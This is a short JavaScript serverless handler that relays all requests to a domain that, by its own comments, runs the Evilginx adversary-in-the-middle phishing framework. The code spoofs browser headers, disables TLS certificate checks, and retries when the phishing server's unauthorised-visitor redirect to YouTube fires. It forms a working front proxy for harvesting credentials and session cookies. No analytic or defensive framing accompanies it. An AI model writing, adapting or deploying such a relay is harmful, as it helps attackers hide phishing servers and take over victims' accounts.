import https from 'https';

export default async function handler(req, res) {
  const targetUrl = `https://login.espeharete.top${req.url}`;
  
  // PERFECTED HEADERS - exactly what Evilginx expects
  const headers = {
    'Host': 'login.espeharete.top',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'max-age=0',
    'TE': 'Trailers'
  };

  try {
    const response = await fetch(targetUrl, {
      method: req.method,
      headers: headers,
      redirect: 'manual', // CRITICAL: handle redirects ourselves
      agent: new https.Agent({ rejectUnauthorized: false }) // Bypass SSL checks
    });

    // INTERCEPT REDIRECTS
    if ([301, 302, 303, 307, 308].includes(response.status)) {
      const location = response.headers.get('location') || '';
      if (location.includes('youtube.com')) {
        // RETRY THE REQUEST WHEN UNAUTH REDIRECT HAPPENS
        const retry = await fetch(targetUrl, {
          method: 'GET',
          headers: { ...headers, 'X-Bypass-Redirect': 'true' },
          redirect: 'manual',
          agent: new https.Agent({ rejectUnauthorized: false })
        });
        return res.status(retry.status).send(await retry.text());
      }
      return res.redirect(response.status, location);
    }

    // FORWARD SUCCESSFUL RESPONSE
    const data = await response.text();
    res.status(response.status).send(data);
    
  } catch (error) {
    console.error('PROXY ERROR:', error);
    res.status(500).send(`Proxy Error: ${error.message}`);
  }
}
